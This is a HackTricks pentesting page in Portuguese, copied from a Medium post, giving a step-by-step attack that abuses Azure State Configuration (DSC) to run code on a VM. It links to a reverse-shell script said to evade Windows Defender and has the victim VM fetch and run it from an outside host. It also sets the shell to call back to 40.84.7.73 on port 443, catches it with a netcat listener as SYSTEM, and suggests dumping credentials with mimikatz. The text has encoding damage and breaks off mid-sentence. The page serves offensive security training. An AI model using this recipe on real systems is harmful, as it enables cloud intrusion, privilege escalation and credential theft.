# Az - State Configuration RCE

<details>

<summary><strong>Apoie o HackTricks e obtenha benef√≠cios!</strong></summary>

* Se voc√™ deseja ver sua **empresa anunciada no HackTricks** ou se deseja acessar a **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**, verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Obtenha o [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm).

</details>

**Este post foi copiado de** [**https://medium.com/cepheisecurity/abusing-azure-dsc-remote-code-execution-and-privilege-escalation-ab8c35dd04fe**](https://medium.com/cepheisecurity/abusing-azure-dsc-remote-code-execution-and-privilege-escalation-ab8c35dd04fe)

### Prepara√ß√£o da Infraestrutura do Servidor Remoto (C2) <a href="#f0fa" id="f0fa"></a>

Eu estarei hospedando uma vers√£o simplificada do payload Nishang Invoke-PowerShellTcp.ps1 do servidor remoto "40.84.7.74", que √© a m√°quina Kali. O nome do payload ser√° "RevPS.ps1". Para evitar que o script Nishang seja exclu√≠do pelo Windows Defender por qualquer motivo (talvez voc√™ prefira deixar o arquivo no disco), tenho uma vers√£o leve aqui que voc√™ pode usar e que ir√° contornar o Defender: [https://github.com/nickpupp0/AzureDSCAbuse/blob/master/RevPS.ps1](https://github.com/nickpupp0/AzureDSCAbuse/blob/master/RevPS.ps1). Isso ser√° hospedado por um servidor Python Simple no Kali.

### Passo 1 ‚Äî Criar Arquivos <a href="#89de" id="89de"></a>

Precisaremos criar outro arquivo de configura√ß√£o DSC. Um modelo pode ser baixado aqui: [https://github.com/nickpupp0/AzureDSCAbuse/blob/master/reverse\_shell\_config.ps1](https://github.com/nickpupp0/AzureDSCAbuse/blob/master/reverse\_shell\_config.ps1). Este arquivo de configura√ß√£o usar√° a mesma fun√ß√£o de grava√ß√£o de arquivo que usamos anteriormente. Desta vez, o conte√∫do inclui c√≥digo para baixar e executar um payload de nosso servidor remoto. Al√©m disso, estamos usando uma fun√ß√£o de tarefa agendada dispon√≠vel no m√≥dulo _ComputerManagementDsc_. A fun√ß√£o de tarefa agendada ser√° o papel-chave na execu√ß√£o e nos fornecer√° privil√©gios do SYSTEM mais tarde.

Tamb√©m baixaremos um script que ser√° usado para publicar nossa configura√ß√£o na VM. Isso est√° localizado aqui: [https://github.com/nickpupp0/AzureDSCAbuse/blob/master/push\_reverse\_shell\_config.ps1](https://github.com/nickpupp0/AzureDSCAbuse/blob/master/push\_reverse\_shell\_config.ps1).

Esses arquivos servir√£o como modelo. **Voc√™ precisar√° preencher os nomes de vari√°veis e par√¢metros com o que est√° usando**. Isso inclui os nomes de recursos, caminhos de arquivos e os nomes de servidor externo/payload que voc√™ est√° usando. Consulte os coment√°rios no c√≥digo.

<figure><img src="../../../../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Passo 2 ‚Äî Compactar Arquivo de Configura√ß√£o <a href="#c2c2" id="c2c2"></a>

Com nossos dois arquivos criados, compactaremos o arquivo **'reverse\_shell\_config.ps1'** para que possa ser enviado para a Conta de Armazenamento

```
Compress-Archive -Path .\reverse_shell_config.ps1 -DestinationPath .\reverse_shell_config.ps1.zip
```

<figure><img src="../../../../.gitbook/assets/image (38).png" alt=""><figcaption></figcaption></figure>

### Passo 3 ‚Äî Definir Contexto de Armazenamento e Fazer Upload <a href="#bed9" id="bed9"></a>

Novamente, configuraremos o contexto de nossa Conta de Armazenamento, o que j√° fiz. J√° tenho um cont√™iner chamado '**azure-pentes**t', ent√£o √© aqui que publicarei o meu:

```
Set-AzStorageBlobContent -File "reverse_shell_config.ps1.zip" -Container "azure-pentest" -Blob "reverse_shell_config.ps1.zip" -Context $ctx
```

<figure><img src="../../../../.gitbook/assets/image (82).png" alt=""><figcaption></figcaption></figure>

### Passo 4 ‚Äî Preparar a M√°quina Kali <a href="#20fb" id="20fb"></a>

Em nossa m√°quina Kali, podemos simplesmente _wget_ nosso payload do PowerShell. O script de reverse-shell bruto est√° localizado aqui: [https://raw.githubusercontent.com/nickpupp0/AzureDSCAbuse/master/RevPS.ps1](https://raw.githubusercontent.com/nickpupp0/AzureDSCAbuse/master/RevPS.ps1).

```
wget https://raw.githubusercontent.com/nickpupp0/AzureDSCAbuse/master/RevPS.ps1
```

<figure><img src="../../../../.gitbook/assets/image (8) (2).png" alt=""><figcaption></figcaption></figure>

Precisamos editar o script de reverse-shell adicionando nossos par√¢metros, para que a VM do Windows saiba onde se conectar assim que for executada. No meu caso, adiciono o seguinte:

```
RevPShell -Reverse 40.84.7.73 443
```

<figure><img src="../../../../.gitbook/assets/image (2) (3).png" alt=""><figcaption></figcaption></figure>

### Passo 5 ‚Äî Publicar Arquivo de Configura√ß√£o <a href="#9ad6" id="9ad6"></a>

Agora executaremos nosso arquivo de configura√ß√£o. Eu configurei o meu para ser publicado na √°rea de trabalho para uma melhor visualiza√ß√£o, mas pode ser publicado em qualquer lugar. Depois de alguns minutos, veremos que o script de reverse-shell foi publicado!

<figure><img src="../../../../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Passo 6 ‚Äî Hospedar Payload e Configurar Listener <a href="#c55f" id="c55f"></a>

Depois de publicarmos a configura√ß√£o, podemos iniciar simultaneamente um servidor Python SimpleHTTPServer na porta 80 para hospedar o payload, juntamente com um listener netcat para capturar a conex√£o:

```
sudo python -m SimpleHTTPServer 80sudo nc -nlvp 443
```

Vemos que a tarefa agendada foi executada e nosso payload foi recuperado e executado na mem√≥ria com privil√©gios do **SYSTEM**!

<figure><img src="../../../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

### Conclus√£o <a href="#1ec2" id="1ec2"></a>

Isso agora abre a porta para muitas possibilidades. Como temos um shell em execu√ß√£o como **SYSTEM**, podemos despejar credenciais com mimikatz (potencialmente arriscado dependendo de qu√£o maduro √© o EDR para recursos em nuvem). Se voc√™ despejar credenciais, h√° uma boa chance de que elas possam ser reutilizadas